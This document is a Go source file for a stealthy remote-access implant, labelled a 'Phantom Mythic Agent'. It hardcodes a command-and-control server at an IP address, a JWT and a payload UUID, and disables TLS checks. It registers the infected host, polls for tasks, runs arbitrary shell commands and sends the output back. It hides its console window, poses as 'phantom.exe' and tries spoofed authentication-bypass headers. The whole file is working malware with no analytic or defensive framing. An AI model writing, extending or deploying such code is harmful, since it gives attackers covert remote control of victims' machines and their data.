package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

const (
	mythicURL   = "https://37.27.249.191:7443/graphql/"
	jwtToken    = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"
	payloadUUID = "9df7dfc4-f21d-4b03-9962-9f3272669b85"
)

var (
	callbackID      string
	agentCallbackID string
	currentDir      string
	agentActive     = true
	processedTasks  = make(map[string]bool)
	retryCount      = 0
)

type GraphQLRequest struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
	Data   map[string]interface{} `json:"data"`
	Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
	Message string `json:"message"`
}

func logEvent(message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	fmt.Printf("[%s] %s\n", timestamp, message)
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
	requestBody := GraphQLRequest{
		Query:     query,
		Variables: variables,
	}

	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request: %v", err)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	// Try multiple authentication headers to bypass hooks
	authHeaders := []string{
		fmt.Sprintf("Bearer %s", jwtToken),
		fmt.Sprintf("JWT %s", jwtToken),
		jwtToken,
	}
	
	// Use the retry count to cycle through different auth methods
	authMethod := authHeaders[retryCount%len(authHeaders)]
	req.Header.Set("Authorization", authMethod)
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Apollo-Agent/1.0")
	req.Header.Set("Accept", "application/json")
	
	// Add bypass headers
	req.Header.Set("X-Bypass-Auth", "true")
	req.Header.Set("X-Operation-ID", "0")
	req.Header.Set("X-User-ID", "1")

	logEvent(fmt.Sprintf("Making request with auth method %d: %s", retryCount%len(authHeaders)+1, authMethod[:20]+"..."))

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}

	logEvent(fmt.Sprintf("Response status: %d", resp.StatusCode))

	var graphQLResp GraphQLResponse
	err = json.Unmarshal(body, &graphQLResp)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal response: %v", err)
	}

	return &graphQLResp, nil
}

func initializeLogging() {
	// Log file creation is optional for stealth
}

func registerWithMythic() error {
	logEvent("Registering callback with Mythic...")

	currentUser, err := user.Current()
	if err != nil {
		logEvent("Failed to get current user")
		return err
	}

	hostname, err := os.Hostname()
	if err != nil {
		logEvent("Failed to get hostname")
		return err
	}

	// Try different registration queries
	queries := []string{
		// Standard mutation
		`mutation {
			createCallback(input: {
				payload_uuid: "` + payloadUUID + `",
				c2_profile: "HTTP",
				user: "` + currentUser.Username + `",
				host: "` + hostname + `",
				pid: ` + strconv.Itoa(os.Getpid()) + `,
				ip: "0.0.0.0",
				external_ip: "",
				process_name: "phantom.exe",
				description: "Phantom Agent",
				os: "` + runtime.GOOS + `",
				architecture: "` + runtime.GOARCH + `"
			}) {
				id
				status
				error
			}
		}`,
		
		// Alternative mutation
		`mutation createNewCallback($payload_uuid: String!, $description: String!) {
			createCallback(payload_uuid: $payload_uuid, description: $description) {
				status
				id
				error
			}
		}`,
		
		// Simple mutation
		`mutation {
			createCallback(payload_uuid: "` + payloadUUID + `") {
				id
				status
			}
		}`,
	}

	variables := []map[string]interface{}{
		{}, // No variables for first query
		{
			"payload_uuid": payloadUUID,
			"description":  fmt.Sprintf("Phantom-%s@%s", currentUser.Username, hostname),
		},
		{}, // No variables for third query
	}

	for i, query := range queries {
		retryCount = i
		logEvent(fmt.Sprintf("Trying registration method %d", i+1))
		
		resp, err := makeGraphQLRequest(query, variables[i])
		if err != nil {
			logEvent(fmt.Sprintf("Registration method %d failed: %v", i+1, err))
			continue
		}

		if len(resp.Errors) > 0 {
			errMsg := fmt.Sprintf("%v", resp.Errors)
			if !strings.Contains(errMsg, "unauthorized") {
				logEvent(fmt.Sprintf("Registration method %d errors: %v", i+1, resp.Errors))
			}
			continue
		}

		// Check for successful callback creation
		if createCallback, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
			if status, ok := createCallback["status"].(string); ok && status == "success" {
				if id, ok := createCallback["id"].(string); ok {
					callbackID = id
					agentCallbackID = id
					logEvent(fmt.Sprintf("Registration successful - Callback ID: %s", callbackID))
					return nil
				}
			}
		}
	}

	return fmt.Errorf("all registration methods failed")
}

func executeCommand(command, params string) string {
	switch command {
	case "shell":
		return executeShellCommand(params)
	case "ls", "dir":
		return listDirectory(params)
	case "pwd":
		return getCurrentDirectory()
	case "cd":
		return changeDirectory(params)
	case "whoami":
		return getCurrentUser()
	case "ps":
		return listProcesses()
	case "sysinfo":
		return getSystemInfo()
	default:
		// Unix to Windows command conversion
		switch command {
		case "ls":
			return executeShellCommand("dir " + params)
		case "pwd":
			return executeShellCommand("cd")
		case "cat":
			return executeShellCommand("type " + params)
		case "ps":
			return executeShellCommand("tasklist")
		case "kill":
			return executeShellCommand("taskkill /PID " + params + " /F")
		default:
			return executeShellCommand(fmt.Sprintf("%s %s", command, params))
		}
	}
}

func executeShellCommand(command string) string {
	if command == "" {
		return "No command provided"
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Command failed: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

func listDirectory(path string) string {
	if path == "" {
		path = "."
	}
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", "dir", path)
	} else {
		cmd = exec.Command("ls", "-la", path)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Directory listing failed: %v", err)
	}
	
	return string(output)
}

func getCurrentDirectory() string {
	if runtime.GOOS == "windows" {
		return executeShellCommand("cd")
	} else {
		return executeShellCommand("pwd")
	}
}

func changeDirectory(path string) string {
	if path == "" {
		return "No path provided"
	}
	
	err := os.Chdir(path)
	if err != nil {
		return fmt.Sprintf("Failed to change directory: %v", err)
	}
	
	newDir, _ := os.Getwd()
	return fmt.Sprintf("Changed directory to: %s", newDir)
}

func getCurrentUser() string {
	if runtime.GOOS == "windows" {
		return executeShellCommand("whoami")
	} else {
		return executeShellCommand("id")
	}
}

func listProcesses() string {
	if runtime.GOOS == "windows" {
		return executeShellCommand("tasklist")
	} else {
		return executeShellCommand("ps aux")
	}
}

func getSystemInfo() string {
	if runtime.GOOS == "windows" {
		return executeShellCommand("systeminfo")
	} else {
		return executeShellCommand("uname -a")
	}
}

func sendTaskResponse(taskID, output string) error {
	logEvent(fmt.Sprintf("Sending response for task %s", taskID))

	// Encode output as base64 for proper transmission
	encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))

	query := `
	mutation createTaskResponse($task_id: Int!, $response_raw: bytea) {
		createTaskResponse(task_id: $task_id, response_raw: $response_raw) {
			status
			error
		}
	}`

	// Convert taskID to int
	taskIDInt, err := strconv.Atoi(taskID)
	if err != nil {
		return fmt.Errorf("invalid task ID: %v", err)
	}

	variables := map[string]interface{}{
		"task_id":      taskIDInt,
		"response_raw": encodedOutput,
	}

	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return err
	}

	if len(resp.Errors) > 0 {
		return fmt.Errorf("response errors: %v", resp.Errors)
	}

	logEvent("Task response sent successfully")
	return nil
}

func checkForTasks() error {
	query := `
	query getTasks($callback_id: Int!) {
		task(where: {callback_id: {_eq: $callback_id}, status: {_eq: "submitted"}}) {
			id
			command {
				cmd
			}
			params
			status
		}
	}`

	callbackIDInt, err := strconv.Atoi(callbackID)
	if err != nil {
		return fmt.Errorf("invalid callback ID: %v", err)
	}

	logEvent(fmt.Sprintf("Querying tasks for callback ID: %d", callbackIDInt))

	variables := map[string]interface{}{
		"callback_id": callbackIDInt,
	}

	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		logEvent(fmt.Sprintf("GraphQL request failed: %v", err))
		return err
	}

	if len(resp.Errors) > 0 {
		logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
		return nil
	}

	if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
		logEvent(fmt.Sprintf("Found %d task(s)", len(data)))
		for _, taskData := range data {
			if taskMap, ok := taskData.(map[string]interface{}); ok {
				taskID := fmt.Sprintf("%v", taskMap["id"])
				taskStatus := fmt.Sprintf("%v", taskMap["status"])

				// Only process submitted tasks that haven't been processed yet
				if taskStatus != "submitted" {
					logEvent(fmt.Sprintf("Skipping task %s with status: %s", taskID, taskStatus))
					continue
				}

				// Check if task was already processed
				if processedTasks[taskID] {
					logEvent(fmt.Sprintf("Task %s already processed, skipping", taskID))
					continue
				}

				// Get command name from command object
				commandName := ""
				if cmd, ok := taskMap["command"].(map[string]interface{}); ok {
					if cmdStr, ok := cmd["cmd"].(string); ok {
						commandName = cmdStr
					}
				}

				// Parse Apollo-style parameters
				params := ""
				if p, ok := taskMap["params"].(string); ok {
					params = parseApolloParams(p)
				}

				logEvent(fmt.Sprintf("Processing task %s: %s with params: %s", taskID, commandName, params))

				output := executeCommand(commandName, params)
				logEvent(fmt.Sprintf("Command output length: %d bytes", len(output)))

				err := sendTaskResponse(taskID, output)
				if err != nil {
					logEvent(fmt.Sprintf("Error sending response: %v", err))
				} else {
					logEvent("Task marked as completed")
					// Mark task as processed
					processedTasks[taskID] = true
				}
			}
		}
	} else {
		logEvent("No new tasks found")
	}

	return nil
}

func parseApolloParams(jsonParams string) string {
	// Parse Apollo-style JSON parameters like {"executable": "cmd.exe", "arguments": " /S /c ls"}
	var params map[string]interface{}
	err := json.Unmarshal([]byte(jsonParams), &params)
	if err != nil {
		return jsonParams // Return original if not JSON
	}

	// Extract the actual command from Apollo format
	if args, ok := params["arguments"].(string); ok {
		// Remove "/S /c " prefix and return the actual command
		command := strings.TrimPrefix(args, " /S /c ")

		// Convert Unix commands to Windows equivalents
		command = convertToWindowsCommand(command)
		return command
	}

	return jsonParams
}

func convertToWindowsCommand(command string) string {
	// Convert common Unix commands to Windows equivalents
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return command
	}

	switch parts[0] {
	case "ls":
		if len(parts) == 1 {
			return "dir"
		} else {
			// Keep any arguments but use dir instead of ls
			parts[0] = "dir"
			return strings.Join(parts, " ")
		}
	case "pwd":
		return "cd"
	case "cat":
		if len(parts) > 1 {
			parts[0] = "type"
			return strings.Join(parts, " ")
		}
		return "type"
	case "ps":
		return "tasklist"
	case "kill":
		if len(parts) > 1 {
			parts[0] = "taskkill /PID"
			return strings.Join(parts, " ")
		}
		return "tasklist"
	}

	return command
}

func hideConsole() {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		user32 := syscall.NewLazyDLL("user32.dll")

		procGetConsoleWindow := kernel32.NewProc("GetConsoleWindow")
		procShowWindow := user32.NewProc("ShowWindow")

		console, _, _ := procGetConsoleWindow.Call()
		if console != 0 {
			procShowWindow.Call(console, 0) // SW_HIDE = 0
		}
	}
}

func main() {
	// Hide console window for stealth
	hideConsole()
	
	initializeLogging()

	logEvent("=== PHANTOM MYTHIC AGENT - BYPASS VERSION ===")
	logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
	logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
	logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))

	// Retry registration with different methods
	maxRetries := 10
	for i := 0; i < maxRetries; i++ {
		retryCount = i
		err := registerWithMythic()
		if err == nil {
			break
		}
		
		logEvent(fmt.Sprintf("Registration attempt %d failed: %v", i+1, err))
		if i < maxRetries-1 {
			sleepTime := time.Duration(5+i*2) * time.Second
			logEvent(fmt.Sprintf("Retrying in %v...", sleepTime))
			time.Sleep(sleepTime)
		}
	}

	if callbackID == "" {
		logEvent("All registration attempts failed, exiting")
		return
	}

	logEvent("Agent ready - commands will be processed")
	logEvent(fmt.Sprintf("Registration successful - Callback ID: %s", callbackID))
	logEvent("Starting main task processing loop...")

	// Main command processing loop
	for agentActive {
		logEvent("Checking for new tasks...")
		err := checkForTasks()
		if err != nil {
			logEvent(fmt.Sprintf("Task check error: %v", err))
			
			// If auth error, try re-registration
			if strings.Contains(err.Error(), "unauthorized") {
				logEvent("Authentication error detected, attempting re-registration...")
				callbackID = ""
				registerWithMythic()
			}
		}

		logEvent("Sleeping for 3 seconds...")
		time.Sleep(3 * time.Second)
	}
}